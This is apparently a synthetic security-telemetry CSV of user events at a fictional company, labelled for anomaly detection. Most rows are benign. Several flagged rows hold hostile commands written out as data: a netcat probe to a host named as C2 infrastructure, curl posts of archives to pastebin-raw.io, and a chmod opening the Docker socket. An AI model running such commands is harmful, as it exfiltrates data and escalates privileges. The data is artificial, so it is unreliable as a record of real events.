timestamp,user_id,username,department,ip_address,event_type,failed_login_attempts,files_affected,usb_bluetooth_usage,bytes_sent_kb,bytes_received_kb,destination_site,application_shell_cmd,status,is_anomaly,action,details
2026-03-13T02:17:48.063Z,usr-104,david.kim,SALES,10.0.7.19,USB_ACTIVITY,0,42,1,90207,81,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-13T02:21:02.251Z,usr-104,david.kim,SALES,10.0.7.19,FILE_DOWNLOAD,0,4,0,79.3,1134,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T02:23:42.125Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,LOGIN,0,3,0,199.6,320.7,docs.google.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T02:26:04.552Z,usr-105,elena.rostova,SECURITY,10.0.9.3,LOGIN,0,2,0,193,1195.9,aws.us-east-1.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T02:29:38.677Z,usr-104,david.kim,SALES,10.0.7.19,LOGIN,0,2,0,200.3,863.8,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T02:32:22.153Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,3,0,118.6,891.6,internal-portal.corp,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T02:34:40.789Z,usr-104,david.kim,SALES,10.0.7.19,FILE_ACCESS,0,4,0,177.9,375.2,internal-portal.corp,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T02:38:24.620Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,4,0,127.6,662.6,docs.google.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T02:40:31.273Z,usr-104,david.kim,SALES,10.0.7.19,API_REQUEST,0,2,0,130.1,203.1,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T02:43:59.665Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,4,0,224.2,871,sharepoint.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T02:46:57.278Z,usr-108,henry.todd,FINANCE,10.0.5.12,API_REQUEST,0,0,0,186.7,103.1,api.github.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T02:49:23.524Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,0,1,0,100.4,394.6,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T02:51:54.151Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,LOGIN,0,0,0,193.9,550.1,docs.google.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T02:55:12.505Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_ACCESS,0,1,0,87.7,909,api.github.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T02:58:05.275Z,usr-104,david.kim,SALES,10.0.7.19,FILE_DOWNLOAD,0,3,0,245.9,940.8,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:01:16.837Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,0,1,0,81.2,626.4,jira.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:04:06.413Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,3,0,141.5,477.5,jira.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:06:27.480Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_ACCESS,0,0,0,95.1,226.5,gitlab.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:09:23.157Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,4,0,185.6,868,api.github.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:12:52.358Z,usr-104,david.kim,SALES,10.0.7.19,FILE_DOWNLOAD,0,1,0,226.3,781.1,sharepoint.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:15:13.702Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,NETWORK_CONNECTION,0,3,0,150.4,40.2,sharepoint.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:17:53.580Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,NETWORK_CONNECTION,0,3,0,116.1,650.5,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:21:20.642Z,usr-108,henry.todd,FINANCE,10.0.5.12,API_REQUEST,0,3,0,191.2,1116.7,jira.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:24:21.847Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,0,3,0,55.9,788.9,api.github.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:27:15.997Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,NETWORK_CONNECTION,0,3,0,177.4,487,internal-portal.corp,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:29:59.537Z,usr-106,frank.miller,IT,10.0.1.50,USB_ACTIVITY,0,47,1,88474.4,173.8,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-13T03:32:11.101Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_DOWNLOAD,0,4,0,143.3,533.8,sharepoint.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:35:04.683Z,usr-105,elena.rostova,SECURITY,10.0.9.3,LOGIN,0,2,0,169,394.4,jira.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:38:15.330Z,usr-106,frank.miller,IT,10.0.1.50,LOGIN,0,4,0,190.9,268.4,aws.us-east-1.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:40:58.746Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,3,0,79.2,1145.9,sharepoint.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:44:04.138Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_DOWNLOAD,0,1,0,96,548.3,docs.google.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:46:57.532Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,API_REQUEST,0,0,0,244.2,182.5,aws.us-east-1.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:49:56.866Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,3,0,215,719.5,aws.us-east-1.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:53:00.251Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_ACCESS,0,4,0,174.3,386.2,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:55:43.633Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_ACCESS,0,3,0,189.5,888.7,internal-portal.corp,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T03:58:31.338Z,usr-103,carol.zhang,HR,10.0.2.88,API_REQUEST,0,1,0,64.6,625.1,jira.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:01:03.908Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,NETWORK_CONNECTION,0,1,0,127.7,550.6,api.github.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:04:20.013Z,usr-106,frank.miller,IT,10.0.1.50,NETWORK_CONNECTION,0,3,0,67.2,1108.1,docs.google.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:07:08.062Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,2,0,237,868.1,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:10:25.180Z,usr-102,bob.martinez,FINANCE,10.0.5.45,NETWORK_CONNECTION,0,0,0,222.3,53.5,sharepoint.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:12:29.666Z,usr-103,carol.zhang,HR,10.0.2.88,SHELL_EXECUTION,2,1,0,315.6,206.2,darknet-gateway.to,chmod 777 /var/run/docker.sock,BLOCKED,1,QUARANTINE,Unauthorized shell command execution attempt
2026-03-13T04:15:51.161Z,usr-108,henry.todd,FINANCE,10.0.5.12,LOGIN,0,2,0,238.1,628.5,jira.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:18:21.285Z,usr-102,bob.martinez,FINANCE,10.0.5.45,LOGIN,0,4,0,251.9,998.5,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:21:56.458Z,usr-106,frank.miller,IT,10.0.1.50,FILE_ACCESS,0,0,0,254.6,455.8,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:24:01.652Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,API_REQUEST,0,0,0,177.2,187.2,internal-portal.corp,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:27:16.231Z,usr-106,frank.miller,IT,10.0.1.50,LOGIN,0,1,0,70.6,434.8,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:30:17.695Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,USB_ACTIVITY,0,78,1,87547.8,187.4,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-13T04:33:07.748Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,NETWORK_CONNECTION,1,26,0,5163,15109.9,c2-beacon-185.xyz,nc -v 185.220.101.4 443,BLOCKED,1,QUARANTINE,Outbound egress probe to adversary C2 infrastructure
2026-03-13T04:35:58.804Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,3,1,193.4,948.1,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:39:21.885Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,0,0,190.9,559.8,docs.google.com,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:42:13.953Z,usr-108,henry.todd,FINANCE,10.0.5.12,LOGIN,0,4,0,113.1,196.9,api.github.com,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:44:58.602Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,0,0,197.8,1116.6,api.github.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:47:03.483Z,usr-106,frank.miller,IT,10.0.1.50,FILE_DOWNLOAD,0,2,0,24.9,769.5,aws.us-east-1.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:50:54.722Z,usr-105,elena.rostova,SECURITY,10.0.9.3,NETWORK_CONNECTION,0,1,0,91.5,1035.9,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:52:55.681Z,usr-103,carol.zhang,HR,10.0.2.88,API_REQUEST,0,0,0,110.3,801.2,docs.google.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:56:26.763Z,usr-102,bob.martinez,FINANCE,10.0.5.45,NETWORK_CONNECTION,0,0,0,60.5,433.7,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T04:58:38.656Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,4,0,181.4,220.7,api.github.com,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:02:25.999Z,usr-103,carol.zhang,HR,10.0.2.88,API_REQUEST,0,2,0,122.7,534.4,internal-portal.corp,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:05:03.277Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,3,0,35.1,572.8,gitlab.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:07:50.103Z,usr-108,henry.todd,FINANCE,10.0.5.12,NETWORK_CONNECTION,0,4,0,223.6,1085.4,api.github.com,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:10:33.262Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,API_REQUEST,0,1,0,112.2,1215.7,docs.google.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:13:26.721Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,2,0,94.4,799.2,docs.google.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:16:27.869Z,usr-105,elena.rostova,SECURITY,10.0.9.3,API_REQUEST,0,1,0,5.8,411.7,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:19:38.609Z,usr-106,frank.miller,IT,10.0.1.50,FILE_ACCESS,0,3,0,93.2,671.7,internal-portal.corp,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:22:05.462Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_ACCESS,0,4,0,237.2,400.1,gitlab.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:25:18.277Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_DOWNLOAD,0,1,0,11.5,314.1,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:27:55.695Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,LOGIN,0,0,0,93.1,428,api.github.com,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:31:05.310Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,API_REQUEST,0,0,0,105.1,756.6,gitlab.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:33:19.527Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_ACCESS,0,4,0,137.2,1024,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:36:35.510Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_ACCESS,0,4,0,254.2,606.3,jira.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:39:23.889Z,usr-104,david.kim,SALES,10.0.7.19,FILE_DOWNLOAD,0,2,0,218.2,209.9,gitlab.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:42:05.151Z,usr-105,elena.rostova,SECURITY,10.0.9.3,LOGIN,0,2,0,19.5,93.5,internal-portal.corp,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:45:08.522Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,API_REQUEST,0,4,0,132.5,355.7,jira.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:48:11.831Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_DOWNLOAD,0,2,0,128,192.4,jira.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:51:09.622Z,usr-106,frank.miller,IT,10.0.1.50,LOGIN,0,1,0,126.9,908.4,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:53:41.499Z,usr-104,david.kim,SALES,10.0.7.19,LOGIN,0,0,0,155.6,112.1,gitlab.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:57:04.456Z,usr-103,carol.zhang,HR,10.0.2.88,NETWORK_CONNECTION,0,2,0,163.2,877.1,docs.google.com,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T05:59:27.956Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,0,0,141.9,253.9,internal-portal.corp,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:02:14.941Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_ACCESS,0,4,0,20.1,214.7,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:05:40.723Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_DOWNLOAD,0,4,0,85.3,518.9,internal-portal.corp,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:08:29.370Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,0,3,0,52.2,518.2,gitlab.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:11:03.977Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,NETWORK_CONNECTION,0,3,0,56,818.4,sharepoint.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:13:43.904Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_DOWNLOAD,0,0,0,161.4,1139.7,docs.google.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:16:59.439Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,0,0,193.5,1132.4,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:19:14.013Z,usr-106,frank.miller,IT,10.0.1.50,FILE_ACCESS,0,2,0,122.6,363.1,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:22:37.106Z,usr-106,frank.miller,IT,10.0.1.50,FILE_DOWNLOAD,0,2,0,13,633.9,sharepoint.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:25:45.235Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_DOWNLOAD,0,4,0,86.1,511.8,gitlab.corp.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:27:54.230Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_ACCESS,0,2,0,102.9,344.8,aws.us-east-1.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:30:58.815Z,usr-102,bob.martinez,FINANCE,10.0.5.45,NETWORK_CONNECTION,0,0,0,102,1177.4,api.github.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:34:10.383Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,1,0,10.9,856.9,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:37:14.130Z,usr-103,carol.zhang,HR,10.0.2.88,API_REQUEST,0,3,0,20.4,533.4,gitlab.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:39:35.936Z,usr-103,carol.zhang,HR,10.0.2.88,API_REQUEST,0,1,0,222.2,1122.4,jira.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:42:19.663Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,2,0,39.7,37.4,gitlab.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:45:52.651Z,usr-108,henry.todd,FINANCE,10.0.5.12,API_REQUEST,0,2,0,154.3,460.6,sharepoint.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:48:32.569Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,NETWORK_CONNECTION,0,2,0,11.9,1027.4,gitlab.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:51:25.373Z,usr-106,frank.miller,IT,10.0.1.50,FILE_DOWNLOAD,0,1,0,190.8,728.8,docs.google.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T06:54:41.524Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,200,0,275855.3,144,pastebin-raw.io,curl -X POST --data-binary @archive.tar.gz,BLOCKED,1,QUARANTINE,Mass file exfiltration velocity to external site (200 files)
2026-03-13T06:57:29.635Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_ACCESS,0,3,0,247.5,364.7,jira.corp.internal,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:00:27.732Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,2,0,74.8,951.3,api.github.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:03:02.638Z,usr-104,david.kim,SALES,10.0.7.19,FILE_DOWNLOAD,0,269,0,266157.8,599.4,pastebin-raw.io,curl -X POST --data-binary @archive.tar.gz,BLOCKED,1,QUARANTINE,Mass file exfiltration velocity to external site (269 files)
2026-03-13T07:05:41.676Z,usr-108,henry.todd,FINANCE,10.0.5.12,FILE_DOWNLOAD,0,0,0,44.4,117.4,gitlab.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:08:15.330Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,LOGIN,4,0,0,4.3,20,auth-sso.corp.internal,none,FAILURE,1,BLOCK,Repeated authentication failure sequence: 4 consecutive attempts
2026-03-13T07:11:29.746Z,usr-105,elena.rostova,SECURITY,10.0.9.3,FILE_ACCESS,0,0,0,103.3,1001.2,internal-portal.corp,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:14:26.952Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_DOWNLOAD,0,4,0,215.1,489.3,jira.corp.internal,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:17:38.547Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_ACCESS,0,2,0,96.8,702.1,sharepoint.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:19:42.848Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,3,0,241.8,413.1,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:22:47.986Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,2,0,148.2,967.8,sharepoint.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:25:59.084Z,usr-102,bob.martinez,FINANCE,10.0.5.45,FILE_DOWNLOAD,0,4,0,61.3,196.8,aws.us-east-1.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:29:13.351Z,usr-105,elena.rostova,SECURITY,10.0.9.3,LOGIN,0,0,0,39,244.9,gitlab.corp.internal,cat README.md,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:31:31.805Z,usr-106,frank.miller,IT,10.0.1.50,API_REQUEST,0,3,0,69.6,357.6,docs.google.com,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:34:23.157Z,usr-104,david.kim,SALES,10.0.7.19,FILE_ACCESS,0,1,0,117.3,1202.2,jira.corp.internal,none,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:37:15.362Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,0,2,0,209.7,439,aws.us-east-1.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:40:22.255Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,NETWORK_CONNECTION,0,4,0,20.9,411.6,gitlab.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:43:12.990Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,1,8,0,2307.6,17531.1,c2-beacon-185.xyz,nc -v 185.220.101.4 443,BLOCKED,1,QUARANTINE,Outbound egress probe to adversary C2 infrastructure
2026-03-13T07:46:22.333Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,NETWORK_CONNECTION,1,32,0,8958.5,15004.6,c2-beacon-185.xyz,nc -v 185.220.101.4 443,BLOCKED,1,QUARANTINE,Outbound egress probe to adversary C2 infrastructure
2026-03-13T07:48:38.283Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,FILE_DOWNLOAD,0,0,0,212.5,253.7,api.github.com,python script.py,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:51:29.671Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,FILE_ACCESS,0,1,0,6.9,1094.5,internal-portal.corp,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:54:20.013Z,usr-103,carol.zhang,HR,10.0.2.88,FILE_DOWNLOAD,0,3,0,242.3,966.7,docs.google.com,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T07:57:32.873Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_DOWNLOAD,0,0,0,94.8,1007.2,aws.us-east-1.internal,npm test,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:00:59.091Z,usr-102,bob.martinez,FINANCE,10.0.5.45,NETWORK_CONNECTION,0,4,1,151.3,310.5,jira.corp.internal,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:03:51.666Z,usr-101,alice.vance,ENGINEERING,10.0.4.12,FILE_DOWNLOAD,0,4,0,211.2,851.3,api.github.com,code .,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:06:02.580Z,usr-109,isabella.rossi,LEGAL,10.0.3.33,LOGIN,1,3,0,104.2,947.5,docs.google.com,docker ps,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:09:08.503Z,usr-107,grace.hopper,ENGINEERING,10.0.4.77,FILE_DOWNLOAD,0,3,0,13,1049.5,sharepoint.corp.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:11:35.905Z,usr-105,elena.rostova,SECURITY,10.0.9.3,NETWORK_CONNECTION,0,1,0,102.6,825.2,aws.us-east-1.internal,git status,SUCCESS,0,ALLOW,Standard baseline telemetry activity
2026-03-13T08:14:27.014Z,usr-110,jack.bauer,EXECUTIVE,10.0.8.5,USB_ACTIVITY,0,69,1,113380.1,218,local_usb_drive_D:,none,SUCCESS,1,ALERT,Unsanctioned USB mass storage write operation detected
2026-03-13T08:17:21.369Z,usr-104,david.kim,SALES,10.0.7.19,NETWORK_CONNECTION,1,17,0,3545.3,6820.6,c2-beacon-185.xyz,nc -v 185.220.101.4 443,BLOCKED,1,QUARANTINE,Outbound egress probe to adversary C2 infrastructure
